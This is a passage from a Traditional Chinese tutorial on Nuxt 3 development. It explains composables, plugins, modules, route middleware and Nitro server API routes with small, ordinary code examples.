\u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; app.vue 1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;ClientOnly\u0026gt; \u0026lt;IronManWelcome /\u0026gt; \u0026lt;template #fallback\u0026gt; \u0026lt;p class=\u0026#34;my-6 flex justify-center\u0026#34;\u0026gt;[IronManWelcome] 載入中...\u0026lt;/p\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;/ClientOnly\u0026gt; \u0026lt;JustClient /\u0026gt; \u0026lt;ClientAndServer /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; 我們重新瀏覽網頁，可以發現到由伺服器渲染的插槽元素 [IronManWelcome] 載入中\u0026hellip; 文字與 ClientAndServer.server.vue 元件，率先被顯示了出來。接著當 JS 載入完畢後，被 包裹的元件 \u0026lt;IronManWelcome\u0026gt; 也接手並覆蓋了「[IronManWelcome] 載入中\u0026hellip;」文字，ClientAndServer.client.vue 與 JustClient.client.vue 僅在客戶端渲染的元件，也分別的覆蓋與顯示出來。\n透過元件我們能更好的整理可重複使用的程式碼，也提升了可維護性，而 Nuxt 中的動態載入更是能將非必要使用的元件延遲載入，大大提升了首次進入網頁所需要下載的檔案大小，最後我們也介紹了如何控制伺服器端或客戶端渲染元件，熟悉了之後就能針對網站需求設定元件的載入及渲染方式囉！\n組合式函數 (Composables) 組合式函數 (Composables) 是一種利用 Vue 3 的 Composition API 來封裝和複用有狀態邏輯的函數，在 Nuxt 我們可以將一些通用的商業邏輯放置在 composables 來建立組合式函數，這樣一來就可以在各個頁面共用這個組合式函數。\nOptions API 與 Composition API 選項式 API (Options API)： 下列這段是 Vue 依據 Options API 撰寫出來的程式碼，也是 Vue 2 處理邏輯的寫法，所謂 Options (選項、可選的) 指的就是以程式碼的性質來分割程式碼，所有設定資料初始值的都會在 data 這邊處理，這個元件所需要的方法則會在 methods 這裡建立，data 及 methods 也就是使用者需要的選項。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;script\u0026gt; export default { data() { return { count: 0, doubleCount: 0 } }, methods: { increment() { this.count += 1 }, incrementByTwo() { this.doubleCount += 2 } } } \u0026lt;/script\u0026gt; 組合式 API (Composition API)： 目前在 Vue 3 你仍可以繼續使用 Vue 2 的 Options API，但隨著程式碼邏輯的增加，看似有條理的分類，其實對於理解及維護上沒有想像中便利。\nVue 3 提出的組合式 API (Composition API) 則是以邏輯功能來進行分類，你可以將所有與某個功能的 data、computed、methods 與 watch \u0026hellip;等，寫在同一個段落行程一個區塊。\n詳細說明可閱讀先前撰寫的圖解 Option API vs Composition API文章。\nMixins 與 Composables 在 Options API 可以使用 mixin 來引入可以重複使用的程式碼，讓不同的元件可以共用函數方法，但隨著專案變大，同一個元件可能使用 mixin 同時來引用許多的共用函數，這將導致容易產生命名衝突、元件間的耦合與來源不夠清晰等問題（詳細原因請參考淺談為什麼 Vue 和 React 都選擇了 Hooks？）。\nVue 3 為我們帶來了組合式 API，實現了更乾淨的程式碼編排與高效的邏輯重用，**組合式函數 (Composables)**也基於組合式 API 來進行封裝這些可複用的邏輯，更解決了使用 mixin 實現共用函數的缺點。\n組合式函數 (Composables) 在 Nuxt 3 中要建立一個組合式函數 (Composables) 我們可以在 composables 目錄下編寫，這些常用的函數，將會被 Nuxt 3 自動載入做使用，實現在各個元件使用這些函數方法。\n建立組合式函數 首先，我們新增 ./composables/useCounter.js，內容如下：\ncomposables/useCounter.js 1 2 3 4 5 6 7 8 9 10 11 12 export default function () { const count = ref(0) const increment = () =\u0026gt; { count.value += 1 } return { count, increment } } Nuxt 自動導入的特性，現在我們就能在其他元件中使用 useCounter 組合式函數。\n新增 ./pages/count.vue，內容如下：\npages/count.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;mt-8 text-4xl text-gray-700\u0026#34;\u0026gt;{{ count }}\u0026lt;/span\u0026gt; \u0026lt;button class=\u0026#34;my-6 rounded-sm bg-sky-600 py-2 px-4 text-base font-medium text-white hover:bg-sky-700 focus:outline-none focus:ring-2 focus:ring-sky-500 focus:ring-offset-2\u0026#34; @click=\u0026#34;increment\u0026#34; \u0026gt; 增加 1 \u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; const { count, increment } = useCounter() \u0026lt;/script\u0026gt; Composables 組合式函數的名稱 前面範例使用的 useCounter() 是 Nuxt 3 從 ./composables/useCounter.js 自動載入的，而且 Nuxt 3 的組合式函數的名稱，有兩種方式會影響使用時的函數名稱，不過也建議在建立組合式函數可以使用 use 作為開頭來加以識別。\n1. 使用預設匯出 (Default export) 如果在檔案內使用的是預設匯出，那麼這個組合式函數在使用時，即對應檔案名稱，檔案名稱可以是小寫駝峰式 (Camel case) 或烤肉串 (Kebab case)，例如建立 ./composables/useCounter.js 或 ./composables/use-counter.js 檔案內容如下，使用時組合式函數為小寫駝峰式(Camel case) 名為 useCounter。\n1 2 3 4 5 6 7 8 9 10 11 12 export default function () { const count = ref(0) const increment = () =\u0026gt; { count.value += 1 } return { count, increment } } 2. 使用具名匯出 (Named export) 如果建立組合式函數時，使用的是有具名的匯出，那麼組合式函數對應的名稱，就不是檔案名稱，而是檔案內 export 出來的名稱。\n例如，建立 ./composables/count.js，檔案內容如下，組合式函數名稱就不會是檔案名稱 count，而是具名導出的名稱 useCounter。\n1 2 3 4 5 6 7 8 9 10 11 12 export const useCounter = () =\u0026gt; { const count = ref(0) const increment = () =\u0026gt; { count.value += 1 } return { count, increment } } Composables 自動載入的規則 composables 目錄下，Nuxt 3 會自動掃描 .js、.ts 與 .vue 副檔名的檔案，但只有最上層的檔案，才會自動的被載入為組合式函數，以下面這個目錄結構為例，只有 ./composables/useCounter.js 才會被正確的自動載入。\n1 2 3 4 composables/ ├── time/ │ └── useDateFormat.js └── useCounter.js 下列這種形式，./composables/time/index.js 也能正確的自動載入：\n1 2 3 4 composables/ ├── time/ │ └── index.js └── useCounter.js 如果你想讓巢狀的目錄結構下也能被 Nuxt 自動掃描載入，那麼你可以使用下面兩種方法：\n一、重新匯出 [推薦] 配置 ./composables/index.js 將目錄下的函數於這裡整理並匯出你需要的作為組合式函數。\n二、配置掃描巢狀目錄 修改 nuxt.config.ts 檔案，配置自動載入額外掃描 composables 下的巢狀目錄。\nnuxt.config.ts 1 2 3 4 5 6 7 8 9 10 11 12 export default defineNuxtConfig({ imports: { dirs: [ // 掃描 composables 目錄頂層 \u0026#39;composables\u0026#39;, // 掃描深度一層的特定檔案 \u0026#39;composables/*/index.{ts,js,mjs,mts}\u0026#39;, // 掃描整個 composables 目錄下的檔案 \u0026#39;composables/**\u0026#39; ] } }) 不論在 Nuxt 3 或是 Vue 3，組合式函數 (Composables) 都是能幫助你在整個網站可以共用函數的方法，目前也有專案 VueUse 提供了常用與實用的組合式函數集合，能幫我們省去不少開發時間與提升重複使用性，VueUse的介紹請點我前往。\n插件 (Plugins) 在開發時，為了不重複造輪子，我們可能會在網路上找看看有沒有現成的套件可以做使用，如果這個套件在 Nuxt 3 沒有專用的模組或插件，那麼我們就只能依照套件的支援與安裝方式嘗試添加至 Nuxt 中使用。這邊將會介紹在 Nuxt 插件的規則與特性，如何建立自己的插件及安裝 Vue 的插件。\n說到插件 (Plugins)，Chrome 或 Firefox 等瀏覽器的使用者，一定都聽過也安裝過插件；如果瀏覽器中的功能不夠滿足你的需求，那麼你可以透過安裝插件來嘗試解決你的問題，而插件做的就是幫助你的瀏覽器或是網站，添加一些功能或是配置，做一個擴充的動作。在 Nuxt 3 指的插件，道理也是一樣的，我們可以透過插件來協助我們擴充功能。\nNuxt 3 插件目錄 Nuxt 將自動讀取 plugins 目錄中的檔案並自動載入它們，也因為目錄中的所有插件都是自動載入的，因此不必於 nuxt.config.ts 中再個別配置。\nNuxt 會自動掃描 plugins 目錄下的 .js、.ts 與 .vue 副檔名的檔案，但只有最上層的檔案或最上層目錄下的 index.js 檔案才會被自動載入。\n例如，只有 ./plugins/myPlugin.js 及 ./plugins/myPlugin/index.js 會自動的被 Nuxt 載入。\n1 2 3 4 plugins/ ├── myPlugin/ │ └── index.js └── myPlugin.js 如何建立插件 當您建立好插件的檔案後，只需要使用預設導出 Nuxt 3 中的 defineNuxtPlugin 方法，傳遞給插件的唯一參數是 nuxtApp，接著就可以在裡頭實作功能。\n1 2 3 export default defineNuxtPlugin(nuxtApp =\u0026gt; { // 可以使用 nuxtApp 來做一些事情 }) 初次建立插件時，可以嘗試印出 nuxtApp 參數看看，如下圖，nuxtApp 包含了各種的實例 (Instance)，例如我們要使用 Vue 的 app.use，就可以在 nuxtApp 找到 Vue 的實例 vueApp，並透過 nuxtApp.vueApp.use 來安裝 Vue 的插件。\n在插件中使用組合式函數 (Composables) 你也可以在自定義的插件中使用組合式函數，但在插件中存在著一些限制和差異。\n插件的載入順序 插件是依照順序來呼叫的，如果你使用的組合式函數，依賴著尚未載入的插件，它將無法正常的執行；除非你很確定插件的載入順序，不然儘量在插件內使用其他會依賴插件或由其他插件所提供的組合式函數。\n依賴 Vue 的生命週期 如果插件內所使用的組合式函數，依賴於 Vue 的生命週期，那麼也會無法正常的執行，因為插件只會綁定到 nuxtApp 的實例上，與 Vue 元件內使用組合式函數綁定的元件實例，有所不同。\nAutomatically Providing Helpers 如果想在 NuxtApp 的實例上提供 helper，我們可以在插件回傳的物件中添加 provide。\n例如，我們建立一個插件 ./plugins/myPlugin.js，內容如下：\nplugins/myPlugin.js 1 2 3 4 5 6 7 export default defineNuxtPlugin(() =\u0026gt; { return { provide: { hello: (msg) =\u0026gt; `Hello ${msg}!` } } }) 調整 ./app.vue 內容：\napp.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;bg-white py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;my-2 text-6xl font-semibold text-sky-400\u0026#34;\u0026gt;{{ title }}\u0026lt;/h1\u0026gt; \u0026lt;h1 class=\u0026#34;my-2 text-6xl font-semibold text-emerald-400\u0026#34;\u0026gt;{{ $hello(\u0026#39;Jennifer\u0026#39;) }}\u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; const { $hello } = useNuxtApp() const title = $hello(\u0026#39;Ryan\u0026#39;) \u0026lt;/script\u0026gt; 我們就可以直接在 template 中使用 $hello，這個由插件提供的 Helper，注意這邊要加上錢字符號 $。也可以透過 useNuxtApp 方法取得 NuxtApp 的實例後再使用 $hello。\n僅限伺服器端或客戶端中使用 有些插件可能只能在瀏覽器中使用，原因可能是這個插件不需要或無法在伺服器端中執行。\n我們可以透過插件的檔案名稱來添加後綴 .client 或 .server，控制伺服器端或客戶端中使用。\nVue 插件與指令 這裡我們嘗試在 Nuxt 3 中使用 Vue 的 vue-gtag 插件，來添加 Google 分析標籤。\nNuxt 3 中使用 vue-gtag 插件 Step 1. 安裝套件 1 2 3 npm install -D vue-gtag-next # or # yarn add -D vue-gtag-next Step 2. 建立 Nuxt 插件 新增 vue-gtag.client.js 檔案，內容如下：\nplugins/vue-gtag.client.js 1 2 3 4 5 6 7 8 9 import VueGtag from \u0026#39;vue-gtag-next\u0026#39; export default defineNuxtPlugin((nuxtApp) =\u0026gt; { nuxtApp.vueApp.use(VueGtag, { property: { id: \u0026#39;GA_MEASUREMENT_ID\u0026#39; } }) }) 完成效果 可以看見瀏覽器就出現使用 vue-gtag 插件，幫我們自動插入與配置 script 的效果囉！\nNuxt 3 中建立 Vue 指令 在插件中可以取得 Vue 的實例，所以我們也能在插件註冊自定義的指令。\n例如，新增 ./plugins/directive.js 檔案，內容如下：\nplugins/directive.js 1 2 3 4 5 6 7 8 9 10 11 export default defineNuxtPlugin((nuxtApp) =\u0026gt; { nuxtApp.vueApp.directive(\u0026#39;focus\u0026#39;, { mounted(el) { el.focus() }, getSSRProps() { // you can provide SSR-specific props here return {} } }) }) 我們就可以直接使用 v-focus 這個指令來控制元素聚焦的效果。\nNuxt 讓我們可以很輕鬆的建立插件並選擇配置於伺服器端或客戶端，對於使用 UI 框架或元件，更能在插件中直接取得實例來安裝 Vue 的插件與指令，不過呢，目前也有個 RFC 正在徵求意見期待讓 Nuxt 使用 Vue 插件可以更方便容易。\n模組 (Modules) Nuxt 提供了一個模組系統來擴展自身框架的核心，也簡化了整合過程中需要的繁瑣配置。當你想擴展 Nuxt 或 Vue 的功能，雖然 Nuxt 可以通過安裝與配置插件進行功能擴展，但是在多個專案或使用上可能繁瑣耗時或重複性很高的，但如果套件已經有針對 Nuxt 模組做整合，我們就不必從頭開始開發或像安裝插件一樣需要建立與維護這些配置。\nNuxt 3 中插件與模組的差異 Nuxt 模組與 Nuxt 插件的差異在於，模組載入執行的時間點更早，意思是 Nuxt 在啟動伺服器後，首先會依序的載入模組並執行，接續建立 Nuxt 的環境 (Context) 與 Vue 的實例 (Instance)，最後才開始執行 Nuxt 的插件。\n因此，Nuxt 模組可以做更多的事情，包含在使用 nuxi dev、nuxi build 啟動或建構 Nuxt 時，可以透過模組來覆蓋模板、配置 webpack 及配置插件等許多任務。\nNuxt 3 安裝使用模組 Nuxt 模組是一個導出異步函數的 JavaScript 檔案，當安裝使用模組時，通常會配置在 nuxt.config.ts 檔案的 modules 中，例如使用 Nuxt Tailwind 模組 會添加上 \u0026rsquo;@nuxtjs/tailwindcss\u0026rsquo;。\n通常模組的開發人員會提供這些模組應該如何在 modules 屬性來做配置，甚至一些可選用的參數來配置這些模組。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 export default defineNuxtConfig({ modules: [ // 使用套件名稱 (推薦使用) \u0026#39;@nuxtjs/example\u0026#39;, // 載入本地目錄的模組 \u0026#39;./modules/example\u0026#39;, // 添加模組的選項參數 [\u0026#39;./modules/example\u0026#39;, { token: \u0026#39;123\u0026#39; }] // 在行內定義模組 async (inlineOptions, nuxt) =\u0026gt; { } ] }) Nuxt 3 模組列表 你可以在 Explore Nuxt Modules 上尋找由 Nuxt 官方或社群生態所發展建置的模組，Nuxt 的模組通常遵循著官方指南所製，使用時只需要安裝與添加至 nuxt.config 中，基本上就能完成配置。\n使用 Nuxt Icon 模組 Nuxt Icon 模組整合了 Iconify 提供多達 100,000 個以上的 Icon 圖示，只要在 Nuxt 中安裝後，我們就可以直接做使用。\nStep 1. 安裝套件 1 2 3 npm install -D nuxt-icon # or # yarn add -D nuxt-icon Step 2. 配置使用模組 在 nuxt.config.ts 中的 modules 屬性，添加 Nuxt Icon 模組的名稱 nuxt-icon。\n1 2 3 export default defineNuxtConfig({ modules: [\u0026#39;nuxt-icon\u0026#39;] }) Step 3. 開始使用 依照說明，我們就可以使用 Nuxt Icon 模組，為我們所添加的元件 \u0026lt;Icon\u0026gt;，這個 Icon 元件可以傳入 name 屬性，以此來顯示不同的 Icon 圖示，size 則可以控制圖示的大小。\n1 2 3 4 5 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;flex justify-center\u0026#34;\u0026gt; \u0026lt;Icon name=\u0026#34;logos:nuxt\u0026#34; size=\u0026#34;360\u0026#34; /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; 如何建立 Nuxt 模組 Nuxt Kit 是 Nuxt 官方提供的一個標準和方便的 API 來定義 Nuxt 模組。\n通常使用如下程式碼使用 defineNuxtModule 方法來建立一個模組：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 import { defineNuxtModule } from \u0026#39;@nuxt/kit\u0026#39; export default defineNuxtModule({ meta: { // 模組的名稱，通常也會對應 NPM 發布的套件名稱 name: \u0026#39;@nuxtjs/example\u0026#39;, // 如果有配置這個模組的一些選項，會將其保存在這個設定鍵值下 configKey: \u0026#39;sample\u0026#39;, // 相容性限制 `nuxt.config` compatibility: { // 為了控制模組的版本相容性，通常會在這裡配置 Nuxt 版本的需求 nuxt: \u0026#39;^3.0.0\u0026#39; } }, // 模組預設的選項 defaults: {}, hooks: {}, async setup(moduleOptions, nuxt) { // Nuxt 啟動載入模組後，模組所執行的邏輯會在這裡實作 } }) 更多 Nuxt 模組的建立指南可以參考 Nuxt 3 - Module Author Guide，這邊就不再贅述，畢竟我們比較常為模組的使用者。\n模組的載入 前面我們使用了 Nuxt Icon 模組，我們也可以閱讀一下 Nuxt Icon v0.1.6 模組套件的原始碼。\n以下是 Nuxt Icon 模組的 module.ts 檔案。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 export default defineNuxtModule\u0026lt;ModuleOptions\u0026gt;({ meta: { name: \u0026#39;nuxt-icon\u0026#39;, configKey: \u0026#39;icon\u0026#39;, compatibility: { nuxt: \u0026#39;^3.0.0-rc.9\u0026#39; } }, defaults: {}, setup (_options, nuxt) { const { resolve } = createResolver(import.meta.url) addComponent({ name: \u0026#39;Icon\u0026#39;, global: true, filePath: resolve(\u0026#39;./runtime/Icon.vue\u0026#39;) }) } }) Nuxt 的模組使用了一個 defineNuxtModule 方法來定義模組，也可以視為模組的入口點，meta.name 對應的就是模組的名稱，也是我們添加至 modules 屬性所需要的模組名稱。\nsetup 就是模組載入後執行的函數，可以看到模組使用 addComponent 為我們 Nuxt 添加了一個元件名稱為 Icon，使用的元件檔案來自 ./runtime/Icon.vue。\n模組中的 runtime/Icon.vue 為我們封裝了 Iconify 圖示的使用邏輯以及取得 Nuxt 配置的參數等。\n透過模組我們可以省去這些繁瑣的封裝與配置，只需要專注在配置模組與開發上面。\n模組與插件其實還是存在著載入執行順序與使用情境上的差異性，以 Nuxt 來說，通常 Nuxt 的插件會是用來封裝及使用 Vue 中會使用到的插件與或套件；而 Nuxt 的模組，會將需要繁瑣配置的套件或插件來與 Nuxt 進行整合與封裝，不論是透過第三方插件或模組，這都將使 Nuxt 在開發與擴充上擁有更多的可能性。\n中間件目錄 (Middleware Directory) 在 Vue 的專案內我們的頁面通常由 Vue Router 來控制路由及導航，Vue Router 提供了導航守衛 (Navigation Guards) 的 Hook API，讓我們可以在全域、路由甚至是元件中，來控制路由跳轉或取消的方式來守護我們的路由，不讓其隨意導航至特定頁面。Nuxt 3 提供了一個中間件的目錄，讓我們可以製作路由的中間件，來實作出類似導航守衛的效果。\nVue Router 的導航守衛 (Navigation Guards) 導航守衛就是在訪問頁面之前，會攔截你的路由請求並執行自訂的驗證邏輯，依據驗證的成功與否，准予放行跳轉至路由頁面，抑或是取消訪問該路由，再依照不同處理方式進行中斷或重導向至特定路由頁面。\n導航守衛在實務上常見的使用情境，就是拿來做頁面訪問的權限驗證，例如，只有管理員才能訪問 /admin 路由下的頁面，我們可能就會添加攔截的 hook 來驗證使用者是否登入及夾帶的 Token 或 Role 是否有權限可以瀏覽，如果驗證成功就准予瀏覽管理員相關頁面，否則，將路由頁面導回至首頁、登入頁或錯誤頁面，如同一個守衛在路由之間進行把關驗證權限。\n我們以 Vue Route v4 來舉例，Vue Route 提供了以下三種情況下可以使用的 hook，分別是在全域、路由或是元件中：\n全域 全域前置守衛 (Global Before Guards) 當全域守衛 hook 添加好之後，每次導航至不同路由時，都會攔截以異步的方式執行相對應的處理邏輯。\n全域守衛提供了 router.beforeEach() hook 可以在進入任何一個路由前進行攔截處理，當導航觸發時就會依照建立的順序做呼叫，因為是異步函數解析執行，所以在所有的守衛 resolve 之前，會一直處於 pending 的狀態。\n全域解析守衛 (Global Resolve Guards) 而同樣屬於全域守衛的 router.beforeResolve() hook 會在所有元件內的導航守衛、路由都被解析及執行完畢後才執行，也就是說這個 router.beforeResolve() 呼叫的時間點晚於 router.beforeEach()。\n全域後置 Hooks (Global After Hooks) 與 router.beforeEach() hook 相反，全域後置 hooks 提供的 router.afterEach() Hook 會是在路由跳轉結束後才觸發，在這裡路由已經完成跳轉，路由本身也不會再被更動，這個 hook 通常用於分析類或設置頁面相關的資訊等輔助型的功能很有幫助。\n路由獨有守衛 (Per-Route Guard) 與 router.beforeEach() 不同，我們可以為每一個路由添加 beforeEnter() hook，來達到每一個路由頁面有不同的執行方法，同時也只會在不同的路由導航中切換才會觸發。\n元件內的守衛 在元件的內部中，也提供三種 hooks 分別為：\nbeforeRouteEnter(): 在路由進入並渲染這個元件之前呼叫，所以還沒有元件的實體可以操作使用。 beforeRouteUpdate(): 目前的路由改變，而且還處於同一個元件中時呼叫。 beforeRouteLeave(): 當導航準備離開時且沒有使用到這個元件時呼叫。 導航守衛 (Navigation Guards) 在導航出發後的 hook 觸發順序如下圖：\nNuxt 3 路由中間件 Nuxt 3 中提供了一個路由中間件的框架，我們可以在專案下建立名為 middleware 目錄，在這個目錄下我們可以建立中間件，並讓整個 Nuxt 頁面或特定的路由做使用，也可以在頁面中添加，這個中間件可以理解為 Vue Router 中的導航守衛 (Navigation Guards)，同樣有 to 與 from 參數用以在導航至特定路由之前驗證權限或執行商業邏輯等。\n路由中間件格式 當我們想要建立路由中間件時，可以在 Nuxt 專案的 middleware 目錄下建立檔案，並預設匯出一個由 defineNuxtRouteMiddleware() 定義的函數，例如：\n1 2 3 4 5 6 export default defineNuxtRouteMiddleware((to, from) =\u0026gt; { if (to.params.id === \u0026#39;1\u0026#39;) { return abortNavigation() } return navigateTo(\u0026#39;/\u0026#39;) }) 路由中間件能接收目前的路由 to 與下一個路由 from 做為參數，如同 Vue Router 的導航守衛，以此我們就可以來做一些判斷與驗證操作。\n路由中間件的回傳 Nuxt 提供了兩個全域的 helpers，可以直接從中間件回傳：\nnavigateTo(to, options) 在插件或中間件中重新定向到給定的路由。也可以直接呼叫它進行頁面導航。\nnavigateTo 參數依序為：\nto： RouteLocationRaw | undefined | null options： { replace: boolean, redirectCode: number, external: boolean } abortNavigation(err) 可以在中間件中回傳 abortNavigation() 來中止導航，並可以選擇是否傳入錯誤訊息。\nabortNavigation 參數為：\nerr?: string | Error\n與 Vue Router 中的導航守衛稍有不同，在 Nuxt 的中間件中可以使用 navigateTo 與 abortNavigation 來決定導航至新的路由或終止導航，如果中間件沒有回傳任何東西，則表示不阻塞導航，如果有下一個中間件，則而移往下一個功能做執行，或者完成路由導航。\nnothing - 不阻塞導航並且會移動到下一個中間件功能。 如果有的話，或者完成路由導航 return navigateTo(\u0026rsquo;/\u0026rsquo;) 或 return navigateTo({ path: \u0026lsquo;/\u0026rsquo; }) - 重定向到給定路徑。 如果使用 navigateTo() 重定向是發生在伺服器端 ，則將 HTTP Status Code 設置為暫時重定向狀態碼 302 Found。\n如果使用 navigateTo() 並夾入 options.redirectCode 屬性，例如 return navigateTo('/', { redirectCode: 301 })，發生的重定向在伺服器端，將 HTTP Status Code 設置為永久重定向狀態碼 301 Moved Permanently。\n路由中間件的種類 在 Nuxt 中路由中間件分為以下三種：\n匿名或者是行內的路由中間件 不需要建立檔案，通常在路由頁面中使用 definePageMeta() 來定義的中間件，就屬於這種類型。\n例如，直接定義一個匿名的中間件在頁面元件中使用：\n1 2 3 4 5 6 7 \u0026lt;script setup\u0026gt; definePageMeta({ middleware: defineNuxtRouteMiddleware(() =\u0026gt; { console.log(`[匿名中間件] 我是直接定義在頁面內的匿名中間件`) }) }) \u0026lt;/script\u0026gt; 具名的路由中間件 在 middleware 目錄下所建立的中間件，當在頁面使用 definePageMeta() 來指定使用具名的中間件時，將透過異步來自動載入。具名的路由的名稱被規範為是烤肉串式 (Kebab case) 命名。\n例如，建立一個 ./middleware/random-redirect.js 中間件檔案：\nmiddleware/random-redirect.js 1 2 3 4 5 6 7 8 export default defineNuxtRouteMiddleware(() =\u0026gt; { if (Math.random() \u0026gt; 0.5) { console.log(`[來自 random-redirect 中間件] 重新導向至 /haha`) return navigateTo(\u0026#39;/haha\u0026#39;) } console.log(`[來自 random-redirect 中間件] 沒發生什麼特別的事情～`) }) 當我們要使用這個中間件時，可以在頁面中使用 definePageMeta() 並傳入 middleware 屬性，來添加路由中間件。\n1 2 3 4 5 \u0026lt;script setup\u0026gt; definePageMeta({ middleware: \u0026#39;random-redirect\u0026#39; }) \u0026lt;/script\u0026gt; 如果中間件有多個，你也可以使用陣列來傳入多個中間件，並且會依序執行這些路由中間件。\n1 2 3 4 5 \u0026lt;script setup\u0026gt; definePageMeta({ middleware: [\u0026#39;random-redirect\u0026#39;, \u0026#39;other\u0026#39;] }) \u0026lt;/script\u0026gt; 當我們在頁面中添加這個中間件後，在切換到這個路由頁面時，約有一半的機會，會被導航至 /haha 頁面。\n全域的路由中間件 在具名的中間件的檔名添加後綴 .global，如 auth.global.js，這個路由中間件將會被自動載入，並在每次導航變更時自動執行。\n例如，我們建立一個 ./middleware/always-run.global.js 中間件檔案，內容如下：\nmiddleware/always-run.global.js 1 2 3 export default defineNuxtRouteMiddleware((to, from) =\u0026gt; { console.log(`[全域中間件] to: ${to.path}, from: ${from.path}`) }) 這個全域的路由中間件，將會在每一次導航切換頁面時執行。\n動態添加路由中間件 你可以使用 addRouteMiddleware() 輔助函數來手動添加全域或命名路由中間件，例如在插件中。\n1 2 3 4 5 6 7 8 9 export default defineNuxtPlugin(() =\u0026gt; { addRouteMiddleware(\u0026#39;global-test\u0026#39;, () =\u0026gt; { console.log(\u0026#39;這個是由插件添加的全域中間件，並將在每次路由變更時執行\u0026#39;) }, { global: true }) addRouteMiddleware(\u0026#39;named-test\u0026#39;, () =\u0026gt; { console.log(\u0026#39;這個是由插件添加的具名中間件，並將會覆蓋任何現有的同名中間件\u0026#39;) }) }) 在 Nuxt 中我們可以使用所提供的中間件框架，來建立路由頁面中的中間件，而路由中間件會在到特定路由之前執行想要運行的邏輯，對於驗證權限等非常方便，也正是實現導航守衛 (Navigation Guards) 的方式。這裡我們主要講述的路由中間件，也將會與我們後面會提到的伺服器端的中間件有所不同，雖然名稱相似但與 Nitro 啟動時執行的伺服器中間件完全不同。\nServer API 與 Nitro Engine 這裡會先介紹一下 Nitro Engine 是什麼東西，Nitro 可能不多人聽過但與 Nuxt 3 息息相關，Nitro 伺服器引擎除了有跨平台支援與多種強大的功能外，更包含了 API 路由的支援，意思就是我們可以直接在基於 Nitro 的 Nuxt 3 上直接開發由後端處理的邏輯或與資料庫互動，再將結果回傳至前端，實作出 Server API。\nNitro Engine 在開始建置 Sever API 之前，先來介紹一下 Nitro 伺服器引擎，Nuxt 3 的一大特點就是採用了一個名為 Nitro 的伺服器引擎 (Server Engine)，Nitro 基於 rollup 與 h3，為達高效能與可移植性目標而建構的最小 HTTP 框架。\nNitro 提供了以下多種功能特色，使得 Nuxt 更佳完善與強大，如同官網所說 Nitro 讓 Nuxt 直接解鎖了新的全端能力。\n快速的開發體驗：開箱即用的特性，無需任何配置，就可以啟動具有 hot module reloading 的開發伺服器，寫完程式碼存檔後，就能讓伺服器載入新的程式邏輯。 基於檔案系統的路由：我們只需要專注在建立伺服器的目錄與頁面，就能擁有自動載入與路由的效果。 可移植且便攜：基本上 Nuxt 3 使用的依賴套件都在 package.json 檔案的 devDependencies 中，建構正式環境的網站時，Nitro 自動拆分的程式碼與打包出來的 .output 目錄不再需要安裝依賴套件，意味著不再有 node_modules，因此部署時更輕便好攜。 混合模式：透過**混合模式 (Hybrid mode)**可以將一部分頁面預渲染產生出靜態頁面，部分頁面是動態的在伺服器或客戶端渲染，讓每個路由頁面有不同的靜態或動態甚至擁有快取規則，這將讓 Nuxt 3 的通用渲染 (Universal Rendering) 方式更進一步成混合渲染 (Hybrid Rendering) 也能結合無伺服器 (Serverless) 來配置混合模式。 看到這裡，可以發現 Nuxt 3 與 Nitro 都下了非常大的功夫，雖然還有些功能尚未穩定與需要改進的地方，但是已經為開發上提供了強大支援與良好的體驗，更多特性與細節可以參考 Nuxt 3 - Server Engine 或 Nitro 官方。\nNuxt 3 的 Server 目錄 我們可以透過 Nuxt 3 專案下的 server 目錄來建立具有 hot module reloading 支援的 Server API 與後端處理邏輯。\nserver 目錄常用的有下面三個子目錄：\napi 在這個目錄的檔案，將會由 Nuxt 自動載入並產生 /api 開頭的路由並對應檔案名稱，例如建立 ./server/api/hello.js，就會擁有 /api/hello 的路由對應這個 API，可以使用 http://localhost:3000/api/hello 訪問該路由。\nroutes 在這個目錄的檔案，將會由 Nuxt 自動載入並產生對應檔案名稱的路由，例如建立 ./server/routes/world.js，就會擁有 /world 的路由對應這個 API，可以使用 http://localhost:3000/world 訪問該路由。\nmiddleware 在這個目錄的檔案，會被 Nuxt 自動載入，並添加至伺服器中間件，並在每個 Request 進入伺服器 API 的路由前執行。\n建立第一個伺服器 API Nuxt 會自動掃描 server 目錄中的檔案結構，建立 Server API 時通常以 .js 或 .ts 作為副檔名，並依照官方建議，每個檔案都應該預設匯出 defineEventHandler() 函數，並在其 handler 內實作處理邏輯。\nhandler 接收了一個 event 參數，用來解析請求的資料，並可以直接回傳一個字串、JSON、Promise 或者使用 event.res.end() 送出請求回應。\n舉例來說，我們建立一個檔案 ./server/api/hello.js，內容如下：\nserver/api/hello.js 1 2 3 4 5 6 export default defineEventHandler(() =\u0026gt; { return { ok: true, data: \u0026#39;Hello World!\u0026#39; } }) 如同 pages 頁面路由一樣，在 ./server/api 目錄下會基於檔案系統結構來產生出相對應的路由，並且會添加一個路由前綴 /api，現在，可以使用 http://localhost:3000/api/hello 訪問該路由，看見回傳的 JSON 資料。\n伺服器路由 基於檔案的路由 前面的例子有提到，Server API 的路由是基於檔案結構來自動產生，如果你不想要有 /api 的前綴，可以將 API 處理邏輯檔案，放置在 ./server/routes 